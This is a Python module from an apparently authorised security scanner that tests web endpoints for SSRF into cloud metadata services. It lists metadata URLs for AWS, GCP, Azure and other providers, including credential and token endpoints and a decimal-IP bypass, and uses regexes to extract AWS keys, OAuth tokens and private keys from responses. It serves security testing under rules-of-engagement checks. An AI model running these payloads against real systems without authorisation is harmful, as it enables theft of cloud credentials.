"""Cloud metadata SSRF.

Two modes:

  Target-side (default, base_url provided):
      Sends cloud-metadata URLs as parameter values to a target endpoint
      and looks for metadata markers in the response. Tests whether the
      TARGET can be tricked into fetching cloud metadata.

  Self-probe (base_url=None, or self_probe=True, or
  ssrf_cloud.allow_scanner_self_probe=true):
      Legacy behavior. Probes cloud metadata directly from the scanner
      host. Only useful when the scanner runs on a cloud instance and
      you want to know whether its own metadata service is reachable.
      This tests the SCANNER, not the target.
"""
import json
import re
from urllib.parse import urlparse

from . import http as _http
from .config import load_engine
from .roe_guard import ROEGuard, ROEViolation


# --- target-side constants -------------------------------------------------
COMMON_SSRF_PARAMS = [
    "url", "uri", "link", "callback", "webhook", "next", "redirect",
    "redirect_uri", "dest", "destination", "image", "img", "fetch",
    "proxy", "target", "feed", "source", "data", "domain", "host",
    "path", "file", "load", "resource", "ref", "return", "return_to",
    "returnUrl", "continue", "site", "page", "u", "r",
]

METADATA_URLS = [
    ("aws_iam",
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
    ("aws_root", "http://169.254.169.254/latest/meta-data/"),
    ("aws_userdata", "http://169.254.169.254/latest/user-data"),
    ("aws_decimal", "http://2852039166/latest/meta-data/"),
    ("gcp_token",
     "http://metadata.google.internal/computeMetadata/v1/"
     "instance/service-accounts/default/token"),
    ("azure_instance",
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
    ("azure_token",
     "http://169.254.169.254/metadata/identity/oauth2/token"
     "?api-version=2018-02-01"
     "&resource=https://management.azure.com/"),
    ("digitalocean", "http://169.254.169.254/metadata/v1.json"),
    ("alibaba", "http://100.100.100.200/latest/meta-data/"),
    ("oracle", "http://169.254.169.254/opc/v1/instance/"),
    ("oracle_identity", "http://169.254.169.254/opc/v2/identity/"),
    ("alibaba_ram", "http://100.100.100.200/latest/meta-data/ram/security-credentials/"),
    ("k8s_sa", "http://169.254.169.254/metadata/v1/instance/service-accounts/"),
]

# Markers indicating that the target reflected a metadata response back.
METADATA_MARKERS = [
    ("ami-id", "AWS IMDS root"),
    ("instance-id", "AWS instance-id"),
    ("iam/security-credentials", "AWS role list path"),
    ("AccessKeyId", "AWS credential field"),
    ("SecretAccessKey", "AWS credential field"),
    ("security-credentials", "AWS credential path"),
    ("computeMetadata", "GCP metadata marker"),
    ("service-accounts", "GCP service account path"),
    ("subscriptionId", "Azure subscription ID"),
    ("aadClientId", "Azure managed identity client"),
    ("tenantId", "Azure tenant ID"),
    ("droplet_id", "DigitalOcean droplet"),
    ("compartmentId", "Oracle Cloud compartment"),
]


# --- self-probe constants (legacy) -----------------------------------------
AWS_IMDS_BASE = "http://169.254.169.254"
AWS_TOKEN_URL = f"{AWS_IMDS_BASE}/latest/api/token"
AWS_METADATA_BASE = f"{AWS_IMDS_BASE}/latest/meta-data"
AWS_CREDS_PATH = f"{AWS_METADATA_BASE}/iam/security-credentials/"
GCP_HOST = "metadata.google.internal"
GCP_ALT_HOST = "169.254.169.254"
GCP_BASE = f"http://{GCP_HOST}/computeMetadata/v1"
GCP_ALT_BASE = f"http://{GCP_ALT_HOST}/computeMetadata/v1"
AZURE_BASE = "http://169.254.169.254"
AZURE_INSTANCE = f"{AZURE_BASE}/metadata/instance?api-version=2021-02-01"

HTML_ERROR_SIGNATURES = [
    "<!doctype html", "<html", "<head>", "404 not found",
    "403 forbidden", "access denied",
]


CRED_PATTERNS = [
    (r"ASIA[A-Z0-9]{16}", "AWS access key (ASIA temporary)"),
    (r"AKIA[A-Z0-9]{16}", "AWS access key (AKIA long-term)"),
    (r'"SecretAccessKey"\s*:\s*"[^"]{20,}"', "AWS secret access key"),
    (r'"Token"\s*:\s*"[^"]{50,}"', "AWS session token"),
    (r"ya29\.[A-Za-z0-9_\-]{20,}", "GCP OAuth access token"),
    (r'"access_token"\s*:\s*"eyJ[A-Za-z0-9_\-]{20,}"', "OAuth JWT token"),
    (r'"client_secret"\s*:\s*"[^"]{10,}"', "OAuth client secret"),
    (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "private key material"),
    (r"eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}",
     "JWT token"),
    (r"subscriptionId['\"]?\s*[:=]\s*['\"]?[0-9a-f]{8}-",
     "Azure subscription ID"),
]


# --- config ----------------------------------------------------------------
def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _direct_metadata_allowed():
    """Legacy flag. Now controls whether scan() defaults to self-probe."""
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("ssrf_cloud", {}).get(
            "allow_scanner_self_probe", False))
    except Exception:
        return False


def _roe_block(guard, url, method="GET"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _is_html(text):
    if not text:
        return False
    low = text.lstrip().lower()[:200]
    return any(low.startswith(s) for s in HTML_ERROR_SIGNATURES)


def _extract_credentials(body):
    hits = []
    for pat, label in CRED_PATTERNS:
        for m in re.finditer(pat, body):
            hits.append({"label": label, "match": m.group(0)[:120]})
    return hits


# --- target-side -----------------------------------------------------------
def _headers_from_kwargs(headers, params, pname, murl):
    h = dict(headers or {})
    h.setdefault("Metadata-Flavor", "Google")
    h.setdefault("Metadata", "true")
    return h


def _target_side_scan(base_url, params=None, headers=None, timeout=10,
                      roe_guard=None):
    params = params or COMMON_SSRF_PARAMS[:10]
    attempts = []
    findings = []
    for pname in params:
        for label, murl in METADATA_URLS:
            h = _headers_from_kwargs(headers, None, pname, murl)
            try:
                with _http.Client(timeout=timeout) as c:
                    r = c.get(base_url, params={pname: murl}, headers=h,
                              follow_redirects=False)
            except _http.ROEBlock as e:
                return {
                    "verdict": "UNKNOWN",
                    "reason": f"ROE_BLOCK: {e}",
                    "evidence": {},
                }
            except Exception as e:
                attempts.append({
                    "param": pname, "target": label,
                    "error": f"{type(e).__name__}: {e}",
                })
                continue
            body = r.text or ""
            attempt = {
                "param": pname,
                "target": label,
                "status": r.status_code,
                "body_len": len(body),
            }
            markers = [m for m, _ in METADATA_MARKERS if m in body]
            if markers:
                attempt["markers"] = markers
                creds = _extract_credentials(body)
                findings.append({
                    "param": pname,
                    "target": label,
                    "markers": markers,
                    "credentials": creds,
                    "preview": body[:400],
                })
            attempts.append(attempt)
            if findings:
                break
        if findings:
            break

    if findings:
        return {
            "verdict": "VULNERABLE",
            "reason": (f"cloud metadata reachable through target param "
                       f"'{findings[0]['param']}' -> {findings[0]['target']} "
                       f"(markers: {', '.join(findings[0]['markers'][:3])})"),
            "evidence": {"findings": findings, "attempts": attempts},
        }
    real = [a for a in attempts if "error" not in a]
    if not real:
        return {
            "verdict": "UNKNOWN",
            "reason": "no successful responses from target",
            "evidence": {"attempts": attempts},
        }
    return {
        "verdict": "PASS",
        "reason": (f"no metadata markers reflected across {len(real)} "
                   f"target responses"),
        "evidence": {"attempts": attempts},
    }


# --- self-probe (legacy) ---------------------------------------------------
def probe_single(url, method="GET", headers=None, timeout=8, verify=None,
                 roe_guard=None, body=None):
    if verify is None:
        verify = _verify_tls()
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"url": url, "blocked": True, "error": f"ROE_BLOCK: {viol}"}
    h = dict(headers or {})
    try:
        with _http.Client(timeout=timeout, verify=verify) as c:
            if method.upper() == "PUT":
                r = c.request("PUT", url, headers=h, content=body)
            else:
                r = c.get(url, headers=h)
        return {"url": url, "status": r.status_code,
                "body": (r.text or "")[:6000],
                "headers": {k.lower(): v for k, v in r.headers.items()}}
    except _http.ConnectError as e:
        return {"url": url, "status": None, "error": f"connection error: {e}"}
    except _http.TimeoutException:
        return {"url": url, "status": None, "error": "timeout"}
    except _http.ROEBlock as e:
        return {"url": url, "status": None, "blocked": True,
                "error": f"ROE_BLOCK: {e}"}
    except Exception as e:
        return {"url": url, "status": None,
                "error": f"{type(e).__name__}: {e}"}


def _self_probe_scan(base_url=None, timeout=8, verify=None, roe_guard=None,
                     include_protocol_smuggling=False, fuzz_param_url=None):
    if verify is None:
        verify = _verify_tls()
    out = {
        "target": base_url or "(self)",
        "providers": {},
        "bypasses": {},
        "protocol_smuggling": None,
        "overall": "UNKNOWN",
        "reason": "",
        "mode": "self_probe",
    }
    aws = probe_single(AWS_METADATA_BASE, timeout=timeout, verify=verify,
                       roe_guard=roe_guard)
    out["providers"]["aws_imds"] = {
        "verdict": "SUSPICIOUS" if aws.get("status") == 200 else "PASS",
        "reason": f"scanner-host IMDS probe HTTP {aws.get('status')}",
        "steps": [aws],
    }
    gcp = probe_single(GCP_BASE + "/instance/service-accounts/default/token",
                       headers={"Metadata-Flavor": "Google"},
                       timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["providers"]["gcp"] = {
        "verdict": "VULNERABLE" if (gcp.get("status") == 200
                                     and "ya29." in (gcp.get("body") or ""))
                   else "PASS",
        "reason": f"scanner-host GCP probe HTTP {gcp.get('status')}",
        "steps": [gcp],
    }
    azure = probe_single(AZURE_INSTANCE, headers={"Metadata": "true"},
                         timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["providers"]["azure"] = {
        "verdict": "SUSPICIOUS"
        if (azure.get("status") == 200
            and "subscriptionid" in (azure.get("body") or "").lower())
        else "PASS",
        "reason": f"scanner-host Azure probe HTTP {azure.get('status')}",
        "steps": [azure],
    }

    rank = {"VULNERABLE": 3, "SUSPICIOUS": 2, "PASS": 1, "UNKNOWN": 0}
    overall = "UNKNOWN"
    for r in out["providers"].values():
        if rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r["verdict"]
    out["overall"] = overall
    out["reason"] = (
        "self-probe (scanner host) — this tests the scanner, not the target"
    )
    return out


# --- public entry point ----------------------------------------------------
def _scan_impl(base_url=None, timeout=8, verify=None, roe_guard=None,
               include_protocol_smuggling=False, fuzz_param_url=None,
               self_probe=None, params=None, headers=None):
    if self_probe is None:
        self_probe = _direct_metadata_allowed()
    if self_probe or not base_url:
        return _self_probe_scan(
            base_url=base_url, timeout=timeout, verify=verify,
            roe_guard=roe_guard,
            include_protocol_smuggling=include_protocol_smuggling,
            fuzz_param_url=fuzz_param_url,
        )
    if verify is None:
        verify = _verify_tls()
    return _target_side_scan(
        base_url, params=params, headers=headers, timeout=timeout,
        roe_guard=roe_guard,
    )


def scan(*args, **kwargs):
    from .contract import make_result
    raw = _scan_impl(*args, **kwargs)
    return make_result(raw, capability="ssrf_cloud", args=args, kwargs=kwargs)


__all__ = ["scan", "probe_single", "_scan_impl"]
